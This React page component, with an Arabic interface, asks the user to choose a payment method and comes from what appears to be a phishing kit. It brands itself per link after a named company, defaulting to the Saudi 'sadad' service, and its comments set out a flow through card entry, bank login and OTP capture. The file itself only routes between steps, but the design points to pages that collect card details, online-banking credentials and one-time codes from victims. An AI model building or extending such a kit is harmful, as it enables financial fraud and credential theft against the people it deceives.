import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { CreditCard, Landmark, ChevronLeft, ShieldCheck, Loader2 } from "lucide-react";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { formatCurrency } from "@/lib/countries";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [method, setMethod] = useState<'card' | 'bank' | null>(null);
  const [isNavigating, setIsNavigating] = useState(false);

  if (isLoading || !linkData) {
    return <div className="min-h-screen flex items-center justify-center"><Loader2 className="animate-spin" /></div>;
  }

  const shippingInfo = linkData.payload as any;
  const rawAmount = shippingInfo?.payment_data?.payment_amount || shippingInfo?.payment_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, linkData.payload?.payment_data?.currency_code || "SAR");
  const serviceKey = linkData.payload?.service_key || 'sadad';

  const handleNext = async () => {
    if (!method) return;
    setIsNavigating(true);
    
    // Logic for Flow: 
    // Card -> 3. Card Input -> 4. OTP
    // Bank -> 3. Bank Selector -> 4. Bank Login -> 5. OTP
    
    if (method === 'card') {
      navigate(`/pay/${id}/card-input`);
    } else {
      navigate(`/pay/${id}/bank-selector`);
    }
  };

  return (
    <DynamicPaymentLayout companyKey={serviceKey}>
      <div className="flex-1 container mx-auto px-4 py-12 max-w-2xl">
        <h1 className="text-3xl font-black text-gray-800 mb-8 text-center">اختر طريقة الدفع</h1>
        
        <div className="grid gap-6 mb-12">
          <button 
            onClick={() => setMethod('card')}
            className={`p-8 rounded-[32px] border-4 transition-all flex items-center justify-between group ${method === 'card' ? 'border-blue-600 bg-blue-50' : 'border-gray-100 bg-white'}`}
          >
            <div className="flex items-center gap-6">
              <div className={`w-16 h-16 rounded-2xl flex items-center justify-center ${method === 'card' ? 'bg-blue-600 text-white' : 'bg-gray-100 text-gray-400'}`}>
                <CreditCard className="w-8 h-8" />
              </div>
              <div className="text-right">
                <h3 className="font-black text-xl text-gray-800">البطاقة البنكية</h3>
                <p className="text-sm text-gray-400 font-bold">مدى، فيزا، ماستركارد</p>
              </div>
            </div>
            <div className={`w-8 h-8 rounded-full border-2 flex items-center justify-center ${method === 'card' ? 'border-blue-600 bg-blue-600 text-white' : 'border-gray-200'}`}>
              <ShieldCheck className="w-5 h-5" />
            </div>
          </button>

          <button 
            onClick={() => setMethod('bank')}
            className={`p-8 rounded-[32px] border-4 transition-all flex items-center justify-between group ${method === 'bank' ? 'border-blue-600 bg-blue-50' : 'border-gray-100 bg-white'}`}
          >
            <div className="flex items-center gap-6">
              <div className={`w-16 h-16 rounded-2xl flex items-center justify-center ${method === 'bank' ? 'bg-blue-600 text-white' : 'bg-gray-100 text-gray-400'}`}>
                <Landmark className="w-8 h-8" />
              </div>
              <div className="text-right">
                <h3 className="font-black text-xl text-gray-800">تسجيل الدخول للبنك</h3>
                <p className="text-sm text-gray-400 font-bold">الدفع المباشر عبر حسابك البنكي</p>
              </div>
            </div>
            <div className={`w-8 h-8 rounded-full border-2 flex items-center justify-center ${method === 'bank' ? 'border-blue-600 bg-blue-600 text-white' : 'border-gray-200'}`}>
              <ShieldCheck className="w-5 h-5" />
            </div>
          </button>
        </div>

        <Button 
          disabled={!method || isNavigating}
          onClick={handleNext}
          className="w-full h-20 text-xl font-black rounded-full bg-blue-600 hover:bg-blue-700 shadow-xl shadow-blue-600/20"
        >
          {isNavigating ? <Loader2 className="animate-spin" /> : 'المتابعة للدفع'}
          <ChevronLeft className="mr-2 w-6 h-6" />
        </Button>
      </div>
    </DynamicPaymentLayout>
  );
};

export default PaymentDetails;
